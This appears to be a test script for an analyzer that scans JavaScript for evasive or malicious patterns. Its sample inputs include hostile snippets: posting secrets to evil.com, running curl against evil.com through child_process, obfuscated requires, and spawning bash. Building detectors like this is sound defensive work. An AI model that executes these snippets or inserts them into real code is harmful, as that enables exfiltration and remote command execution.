'use strict';

const evasion = require('../index');

const cases = [
  ['expressServer', `const express = require('express'); const app = express(); app.get('/', (req, res) => { res.send('Hello'); }); app.listen(3000);`],
  ['unitTestEval', `eval('2 + 2');`],
  ['base64ImageData', `const img = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';`],
  ['requireMultiple', `const _ = require('lodash'); const express = require('express'); const helmet = require('helmet');`],
  ['cryptoHashing', `const crypto = require('crypto'); crypto.pbkdf2Sync('pass', 'salt', 100000, 64, 'sha512');`],
  ['npmScript', `"postinstall": "node setup.js"`],
  ['envConfig', `const port = process.env.PORT || 3000;`],
  ['stringConcatRequire', `const cp = require('ch' + 'ild_process'); cp.exec('id');`],
  ['moduleConstructor', `const Module = require('module'); const original = Module._resolveFilename;`],
  ['outboundAxios', `axios.post('http://evil.com/exfil', { data: secrets });`],
  ['obfuscatorIoPattern', `var _0x4b82 = ['hello', 'world']; (function(_0x1234, _0x5678) { var _0x9abc = function(_0xdef0) { while (--_0xdef0) { _0x1234['push'](_0x1234['shift']()); } }; _0x9abc(++_0x5678); }(_0x4b82, 0x1b4));`],
  ['bracketNotationSpawn', `const cp = require('child_process'); const method = 'spawn'; cp[method]('bash');`],
  ['mixed', `const express = require('express'); const app = express(); const cp = require('child_process'); cp['exec']('curl evil.com');`],
];

for (const [name, code] of cases) {
  const r = evasion.analyze(code, `${name}.js`);
  console.log(`=== ${name} === verdict=${r.verdict} findings=${r.summary.totalFindings}`);
  for (const f of r.findings) {
    console.log(`  ${f.source} ${f.id}: ${f.description.substring(0, 80)}`);
  }
  console.log();
}
